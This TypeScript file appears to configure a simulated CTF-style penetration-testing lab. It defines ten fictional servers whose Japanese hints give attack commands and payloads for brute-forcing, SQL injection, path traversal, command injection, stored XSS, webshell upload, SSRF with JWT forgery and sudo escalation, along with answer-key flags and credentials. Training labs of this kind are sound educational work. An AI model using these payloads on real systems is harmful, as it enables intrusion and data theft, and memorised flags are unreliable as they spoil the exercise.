import { TargetServer, VulnerabilityType } from '../types/lab';

export const INITIAL_TARGETS: TargetServer[] = [
  {
    id: 'lvl-1',
    level: 1,
    isCustom: false,
    name: 'NovaCorp Static Portal',
    hostname: 'portal.nova-corp.local',
    ip: '10.10.1.10',
    os: 'Ubuntu 22.04.4 LTS',
    webServer: 'nginx/1.24.0',
    cms: 'Custom',
    techStack: ['Nginx 1.24', 'HTML5', 'Static CSS'],
    difficultyLabel: '超初級',
    briefing:
      '開発者が公開した静的コーポレートサイト。HTMLソースコードや公開除外ファイル（robots.txt）に機密パスが残されている疑いがあります。',
    hints: [
      'Webタブの「ソース表示」または curl http://10.10.1.10 でHTMLコメントを確認してみましょう。',
      'gobuster dir -u http://10.10.1.10 や dirb、または /robots.txt を調査すると隠しパスが見つかります。',
    ],
    flag: 'FLAG{lvl1_html_source_and_robots_inspector}',
    status: 'running',
    ufwEnabled: false,
    wafEnabled: false,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'nginx 1.24.0 (Ubuntu)' },
    ],
    vulnerabilities: ['html_leak'],
    credentials: [],
    themeAccent: 'emerald',
    siteTitle: 'NovaCorp Solutions',
    siteSubtitle: '次世代クラウドインフラストラクチャ',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [
      {
        path: '/var/www/html/secret-backup/flag.txt',
        content: 'FLAG{lvl1_html_source_and_robots_inspector}',
        owner: 'www-data',
        permissions: '-rw-r--r--',
      },
    ],
  },
  {
    id: 'lvl-2',
    level: 2,
    isCustom: false,
    name: 'DevNotes Auth Portal',
    hostname: 'devnotes.nova-corp.local',
    ip: '10.10.2.10',
    os: 'Ubuntu 22.04.4 LTS',
    webServer: 'Apache/2.4.58',
    cms: 'Custom',
    techStack: ['Apache 2.4', 'PHP 8.1', 'Session Auth'],
    difficultyLabel: '初級',
    briefing:
      '社内メモ管理システム。認証フォームが設置されていますが、ディレクトリ探索でログが露出しているか、脆弱なパスワードが設定されています。',
    hints: [
      'gobuster dir -u http://10.10.2.10 または nikto -h 10.10.2.10 で /logs/ や /login を探しましょう。',
      'hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.2.10 http-post-form でパスワードを特定するか、露出したログを確認してください。',
    ],
    flag: 'FLAG{lvl2_weak_credentials_hydra_pwned}',
    status: 'running',
    ufwEnabled: false,
    wafEnabled: false,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache httpd 2.4.58 ((Ubuntu))' },
      { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.9p1 Ubuntu' },
    ],
    vulnerabilities: ['weak_auth'],
    credentials: [{ username: 'admin', password: 'letmein', role: 'administrator' }],
    themeAccent: 'sky',
    siteTitle: 'DevNotes Internal',
    siteSubtitle: 'エンジニアリングチーム専用ドキュメント',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [
      {
        path: '/var/www/html/logs/auth.log',
        content: '[WARN] Failed login for user "admin" (hint: common rockyou pass: letmein?)',
        owner: 'www-data',
        permissions: '-rw-r--r--',
      },
    ],
  },
  {
    id: 'lvl-3',
    level: 3,
    isCustom: false,
    name: 'ShopLite E-Commerce',
    hostname: 'shoplite.nova-corp.local',
    ip: '10.10.3.10',
    os: 'Ubuntu 24.04 LTS',
    webServer: 'Apache/2.4.58',
    cms: 'Custom',
    techStack: ['Apache 2.4', 'PHP 8.2', 'MySQL 8.0'],
    difficultyLabel: '初級+',
    briefing:
      'オンラインストアの商品検索・詳細ページ。データベースクエリがパラメータを適切にサニタイズしておらず、SQLインジェクションの脆弱性があります。',
    hints: [
      'sqlmap -u "http://10.10.3.10/product?id=1" --dump を実行してみましょう。',
      "Webタブの商品検索バーに `' OR 1=1--` や `1 UNION SELECT 1,flag,3 FROM secrets--` を入力することもできます。",
    ],
    flag: 'FLAG{lvl3_union_sqli_database_dumped}',
    status: 'running',
    ufwEnabled: true,
    wafEnabled: false,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache httpd 2.4.58' },
      { port: 3306, protocol: 'tcp', state: 'filtered', service: 'mysql', version: 'MySQL 8.0.36' },
    ],
    vulnerabilities: ['sqli'],
    credentials: [],
    themeAccent: 'amber',
    siteTitle: 'ShopLite Catalog',
    siteSubtitle: 'セキュリティハードウェア＆ガジェット',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [],
  },
  {
    id: 'lvl-4',
    level: 4,
    isCustom: false,
    name: 'BlogPress Tech Media',
    hostname: 'blog.nova-corp.local',
    ip: '10.10.4.10',
    os: 'Ubuntu 22.04.4 LTS',
    webServer: 'nginx/1.22.1',
    cms: 'WordPress',
    techStack: ['Nginx 1.22', 'WordPress 6.1.1', 'PHP 8.0', 'MariaDB'],
    difficultyLabel: '中級-',
    briefing:
      'テック企業のWordPressブログ。古いプラグインがインストールされており、パストラバーサル（LFI）によってサーバー上のファイルが読み取れる状態です。',
    hints: [
      'wpscan --url http://10.10.4.10 や nuclei -u http://10.10.4.10、whatweb http://10.10.4.10 で脆弱なプラグインを特定しましょう。',
      'curl "http://10.10.4.10/wp-content/plugins/simple-file-viewer/view.php?file=../../../../etc/flag.txt" で機密ファイルを読み出せます。',
    ],
    flag: 'FLAG{lvl4_wordpress_plugin_lfi_traversal}',
    status: 'running',
    ufwEnabled: true,
    wafEnabled: false,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'nginx 1.22.1' },
    ],
    vulnerabilities: ['lfi_wp'],
    credentials: [{ username: 'editor', password: 'summer2024', role: 'editor' }],
    themeAccent: 'indigo',
    siteTitle: 'NovaTech Engineering Blog',
    siteSubtitle: 'アーキテクチャと運用の舞台裏',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [
      {
        path: '/etc/flag.txt',
        content: 'FLAG{lvl4_wordpress_plugin_lfi_traversal}',
        owner: 'root',
        permissions: '-rw-r--r--',
      },
      {
        path: '/etc/passwd',
        content: 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\neditor:x:1001:1001::/home/editor:/bin/bash',
        owner: 'root',
        permissions: '-rw-r--r--',
      },
    ],
  },
  {
    id: 'lvl-5',
    level: 5,
    isCustom: false,
    name: 'NetDiag Ping Utility',
    hostname: 'netdiag.nova-corp.local',
    ip: '10.10.5.10',
    os: 'Ubuntu 24.04 LTS',
    webServer: 'Express/4.19.2 (Node.js)',
    cms: 'Node.js',
    techStack: ['Node.js 20', 'Express 4.19', 'Linux Shell Exec'],
    difficultyLabel: '中級',
    briefing:
      'ネットワーク疎通確認用のWebツール。セミコロン `;` は簡易フィルタでブロックされていますが、他のシェル演算子を使ったOSコマンドインジェクションが可能です。',
    hints: [
      'commix -u "http://10.10.5.10/api/ping?host=127.0.0.1" を実行してインジェクションポイントを検証してください。',
      'Webフォームまたは curl で `127.0.0.1 | cat /var/www/flag.txt` や `127.0.0.1 && ls /var/www` を試してみましょう。',
    ],
    flag: 'FLAG{lvl5_os_command_injection_pipe_bypass}',
    status: 'running',
    ufwEnabled: true,
    wafEnabled: false,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Node.js Express framework' },
    ],
    vulnerabilities: ['cmdi'],
    credentials: [],
    themeAccent: 'cyan',
    siteTitle: 'NetDiag Diagnostics',
    siteSubtitle: 'ICMP疎通確認＆ネットワーク診断コンソール',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [
      {
        path: '/var/www/flag.txt',
        content: 'FLAG{lvl5_os_command_injection_pipe_bypass}',
        owner: 'node',
        permissions: '-rw-r--r--',
      },
    ],
  },
  {
    id: 'lvl-6',
    level: 6,
    isCustom: false,
    name: 'JoomPortal Intranet',
    hostname: 'intranet.nova-corp.local',
    ip: '10.10.6.10',
    os: 'Ubuntu 22.04.4 LTS',
    webServer: 'Apache/2.4.54',
    cms: 'Joomla',
    techStack: ['Apache 2.4', 'Joomla! 3.10.11', 'PHP 7.4'],
    difficultyLabel: '中級+',
    briefing:
      'Joomlaベースの社内ポータル。一般ユーザーCookieやHTTPリクエストヘッダで権限判定を行っており、プロキシツール（Burp Suite / Caido / OWASP ZAP）による改ざんで管理者領域へ侵入できます。',
    hints: [
      'joomscan -u http://10.10.6.10 や wappalyzer http://10.10.6.10 で構成を確認しましょう。',
      'Webタブでプロキシ（Burp Suite / Caido / ZAP）を開き、/administrator/vault へのリクエストで Cookie `role=admin` またはヘッダ `X-Role: admin` を送信してください。',
    ],
    flag: 'FLAG{lvl6_joomla_proxy_cookie_tamper_admin}',
    status: 'running',
    ufwEnabled: true,
    wafEnabled: false,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache httpd 2.4.54' },
    ],
    vulnerabilities: ['header_cookie_tamper'],
    credentials: [{ username: 'staff', password: 'Password123!', role: 'user' }],
    themeAccent: 'violet',
    siteTitle: 'JoomPortal Intranet',
    siteSubtitle: '部門間ナレッジ＆承認ポータル',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [],
  },
  {
    id: 'lvl-7',
    level: 7,
    isCustom: false,
    name: 'FeedbackBoard Pro',
    hostname: 'feedback.nova-corp.local',
    ip: '10.10.7.10',
    os: 'Ubuntu 24.04 LTS',
    webServer: 'nginx/1.24.0',
    cms: 'Custom',
    techStack: ['Nginx 1.24', 'Python Flask 3.0', 'Admin Headless Bot'],
    difficultyLabel: '上級-',
    briefing:
      '顧客フィードバック掲示板。管理者ボットが投稿内容を定期的に自動巡回しています。蓄積型XSSを仕込んで管理者セッションまたは内部APIのフラグを奪取してください。',
    hints: [
      'xsser -u "http://10.10.7.10/post" や wapiti -u http://10.10.7.10、skipfish -o out http://10.10.7.10 でXSSを検知できます。',
      '投稿フォームに `<script>fetch("/api/admin/flag")</script>` または `<img src=x onerror="exfil()">` を送信し、管理ボット巡回後の `/api/exfil` ログを確認してください。',
    ],
    flag: 'FLAG{lvl7_stored_xss_admin_bot_exfiltrated}',
    status: 'running',
    ufwEnabled: true,
    wafEnabled: false,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'nginx 1.24.0 (Gunicorn)' },
    ],
    vulnerabilities: ['stored_xss'],
    credentials: [],
    themeAccent: 'rose',
    siteTitle: 'FeedbackBoard Pro',
    siteSubtitle: 'ユーザーフィードバック収集ボード',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: ['[System] Admin Bot initialized. Polling /board every request cycle.'],
    remoteFiles: [],
  },
  {
    id: 'lvl-8',
    level: 8,
    isCustom: false,
    name: 'CloudUpload Vault',
    hostname: 'upload.nova-corp.local',
    ip: '10.10.8.10',
    os: 'Ubuntu 22.04.4 LTS',
    webServer: 'Apache/2.4.57',
    cms: 'Custom',
    techStack: ['Apache 2.4', 'PHP 8.1', 'Multipart Upload'],
    difficultyLabel: '上級',
    briefing:
      'アバターや書類をアップロードできるファイル共有サーバー。拡張子やMIMEタイプの検証が不完全であり、Webシェル（Weevely）を設置してリモートコマンド実行が可能です。',
    hints: [
      'ffuf -u http://10.10.8.10/FUZZ -w /usr/share/wordlists/common.txt や wfuzz で /upload.php と /uploads/ を発見してください。',
      'ターミナルで `weevely generate pass123 shell.phtml` を生成し、Webタブまたは curl でアップロードしたあと `weevely http://10.10.8.10/uploads/shell.phtml pass123` で侵入します。',
    ],
    flag: 'FLAG{lvl8_weevely_webshell_upload_rce}',
    status: 'running',
    ufwEnabled: true,
    wafEnabled: false,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache httpd 2.4.57' },
    ],
    vulnerabilities: ['file_upload_rce'],
    credentials: [],
    themeAccent: 'orange',
    siteTitle: 'CloudUpload Vault',
    siteSubtitle: 'セキュア・ドキュメント共有ストレージ',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [
      {
        path: '/var/www/html/flag_vault.txt',
        content: 'FLAG{lvl8_weevely_webshell_upload_rce}',
        owner: 'www-data',
        permissions: '-rw-r-----',
      },
    ],
  },
  {
    id: 'lvl-9',
    level: 9,
    isCustom: false,
    name: 'AuthGate API Gateway',
    hostname: 'authgate.nova-corp.local',
    ip: '10.10.9.10',
    os: 'Ubuntu 24.04 LTS',
    webServer: 'Envoy / Node.js API',
    cms: 'Node.js',
    techStack: ['Node.js 20', 'JWT HS256', 'Internal Microservice :8080'],
    difficultyLabel: '熟練',
    briefing:
      'マイクロサービスAPIゲートウェイ。外部からは80番のみ公開されていますが、URLプレビュー機能にSSRF脆弱性があり、内部ポート8080からJWT署名鍵を窃取して管理者トークンを偽造できます。',
    hints: [
      'nmap 10.10.9.10 と ffuf で /api/fetch と /api/v2/admin/vault を特定してください。',
      'SSRFエンドポイント `/api/fetch?url=http://127.0.0.1:8080/secret-config` でJWT秘密鍵を取得し、Burp/Caido Repeaterまたは curl で `Authorization: Bearer <admin-token>` を送ります。',
    ],
    flag: 'FLAG{lvl9_ssrf_internal_jwt_forgery}',
    status: 'running',
    ufwEnabled: true,
    wafEnabled: true,
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Envoy Proxy / Node.js' },
      { port: 8080, protocol: 'tcp', state: 'filtered', service: 'http-proxy', version: 'Internal Config Service' },
    ],
    vulnerabilities: ['ssrf_jwt'],
    credentials: [],
    themeAccent: 'teal',
    siteTitle: 'AuthGate API Gateway',
    siteSubtitle: 'ゼロトラスト認証＆Webhookプロキシ',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [],
  },
  {
    id: 'lvl-10',
    level: 10,
    isCustom: false,
    name: 'Aegis Sovereign Core',
    hostname: 'aegis.nova-corp.local',
    ip: '10.10.10.10',
    os: 'Ubuntu 24.04.1 LTS (Hardened)',
    webServer: 'nginx/1.26.0 + ModSecurity WAF',
    cms: 'GraphQL',
    techStack: ['Nginx + WAF', 'GraphQL API', 'OpenSSH 9.6p1', 'Systemd'],
    difficultyLabel: '極限',
    briefing:
      '最終防衛ライン。WAFにより通常の自動スキャンは遮断されます。X-Forwarded-ForバイパスでWAFを回避し、GraphQL/SQLiからSSH認証情報を抽出、SSH侵入後のsudo権限昇格でrootフラグを奪取してください。',
    hints: [
      '1) nmap -p- 10.10.10.10 でポート 8443 と SSH 2222 を発見。',
      '2) Burp/Caido/curl で `X-Forwarded-For: 127.0.0.1` を付与して `/api/graphql` にアクセスし、`admin_secrets` または SQLコメントバイパス `/**/` で SSH 資格情報 (`ops_admin` / `Aegis#Root2026!`) を取得。',
      '3) `ssh ops_admin@10.10.10.10 -p 2222` でログイン後、`sudo -l` と `sudo cat /root/aegis_master_flag.txt` を実行！',
    ],
    flag: 'FLAG{lvl10_aegis_waf_bypass_ssh_privesc_root}',
    status: 'running',
    ufwEnabled: true,
    wafEnabled: true,
    ports: [
      { port: 8443, protocol: 'tcp', state: 'open', service: 'https-alt', version: 'nginx 1.26.0 (WAF Protected)' },
      { port: 2222, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 9.6p1 Ubuntu 3ubuntu13' },
    ],
    vulnerabilities: ['waf_chain_ssh'],
    credentials: [{ username: 'ops_admin', password: 'Aegis#Root2026!', role: 'ops' }],
    themeAccent: 'red',
    siteTitle: 'Aegis Sovereign Core',
    siteSubtitle: '最重要インフラ統制ノード · WAF保護有効',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: [],
    remoteFiles: [
      {
        path: '/home/ops_admin/readme.txt',
        content: 'Maintenance note: backup script requires sudo privileges. Check `sudo -l`.',
        owner: 'ops_admin',
        permissions: '-rw-r--r--',
      },
      {
        path: '/root/aegis_master_flag.txt',
        content: 'FLAG{lvl10_aegis_waf_bypass_ssh_privesc_root}',
        owner: 'root',
        permissions: '-rw-------',
      },
    ],
    sshUser: {
      username: 'ops_admin',
      password: 'Aegis#Root2026!',
      sudoRule: '(root) NOPASSWD: /usr/bin/cat /root/*, /usr/bin/systemctl status *',
    },
  },
];

export interface CustomServerInput {
  name: string;
  hostname: string;
  ip: string;
  level: number;
  webServer: string;
  cms: 'Custom' | 'WordPress' | 'Joomla' | 'Node.js' | 'GraphQL';
  ufwEnabled: boolean;
  wafEnabled: boolean;
  sshEnabled: boolean;
  vulnerabilities: VulnerabilityType[];
  siteTitle: string;
  siteSubtitle: string;
  flag: string;
  adminPassword: string;
}

const DIFFICULTY_LABELS: Record<number, string> = {
  1: '超初級',
  2: '初級',
  3: '初級+',
  4: '中級-',
  5: '中級',
  6: '中級+',
  7: '上級-',
  8: '上級',
  9: '熟練',
  10: '極限',
};

export function createCustomTargetServer(input: CustomServerInput): TargetServer {
  const ports: TargetServer['ports'] = [
    {
      port: input.level >= 9 ? 8443 : 80,
      protocol: 'tcp',
      state: 'open',
      service: input.level >= 9 ? 'https-alt' : 'http',
      version: input.webServer,
    },
  ];

  if (input.sshEnabled) {
    ports.push({
      port: 22,
      protocol: 'tcp',
      state: 'open',
      service: 'ssh',
      version: 'OpenSSH 9.6p1 Ubuntu',
    });
  }

  if (input.vulnerabilities.includes('sqli')) {
    ports.push({
      port: 3306,
      protocol: 'tcp',
      state: input.ufwEnabled ? 'filtered' : 'open',
      service: 'mysql',
      version: 'MySQL 8.0.36',
    });
  }

  const vulnLabels = input.vulnerabilities.join(', ') || 'Hardened';
  const cleanFlag = input.flag.trim() || `FLAG{custom_${Date.now().toString(36)}}`;

  return {
    id: `custom-${Date.now()}`,
    level: input.level,
    isCustom: true,
    name: input.name.trim() || 'Custom Lab Server',
    hostname: input.hostname.trim().toLowerCase() || `custom-${Math.floor(Math.random() * 90 + 10)}.local`,
    ip: input.ip.trim() || `10.10.20.${Math.floor(Math.random() * 200 + 10)}`,
    os: 'Ubuntu 24.04 LTS (Custom)',
    webServer: input.webServer,
    cms: input.cms,
    techStack: [input.webServer, input.cms, ...(input.wafEnabled ? ['ModSecurity WAF'] : [])],
    difficultyLabel: DIFFICULTY_LABELS[input.level] || 'カスタム',
    briefing: `ユーザー作成サーバー（強度 ${input.level}/10）。有効化された攻撃面: ${vulnLabels}`,
    hints: [
      `まずは nmap ${input.ip} や whatweb http://${input.ip} で構成を調査しましょう。`,
      `有効な脆弱性 (${vulnLabels}) に対応するツール（sqlmap / commix / gobuster / hydra / weevely / burpsuite 等）で攻略できます。`,
    ],
    flag: cleanFlag,
    status: 'running',
    ufwEnabled: input.ufwEnabled,
    wafEnabled: input.wafEnabled,
    ports,
    vulnerabilities: input.vulnerabilities,
    credentials: [{ username: 'admin', password: input.adminPassword || 'password123', role: 'administrator' }],
    themeAccent: 'emerald',
    siteTitle: input.siteTitle.trim() || input.name,
    siteSubtitle: input.siteSubtitle.trim() || 'カスタム検証環境',
    uploadedShells: {},
    xssPayloads: [],
    exfilLogs: ['[System] Custom target deployed and listening.'],
    remoteFiles: [
      {
        path: '/var/www/html/secret-backup/flag.txt',
        content: cleanFlag,
        owner: 'www-data',
        permissions: '-rw-r--r--',
      },
      {
        path: '/etc/flag.txt',
        content: cleanFlag,
        owner: 'root',
        permissions: '-rw-r--r--',
      },
      {
        path: '/var/www/flag.txt',
        content: cleanFlag,
        owner: 'www-data',
        permissions: '-rw-r--r--',
      },
      {
        path: '/var/www/html/flag_vault.txt',
        content: cleanFlag,
        owner: 'www-data',
        permissions: '-rw-r--r--',
      },
      {
        path: '/root/aegis_master_flag.txt',
        content: cleanFlag,
        owner: 'root',
        permissions: '-rw-------',
      },
    ],
    sshUser: input.sshEnabled
      ? {
          username: 'admin',
          password: input.adminPassword || 'password123',
          sudoRule: '(root) NOPASSWD: /usr/bin/cat /root/*, /usr/bin/systemctl status *',
        }
      : undefined,
  };
}
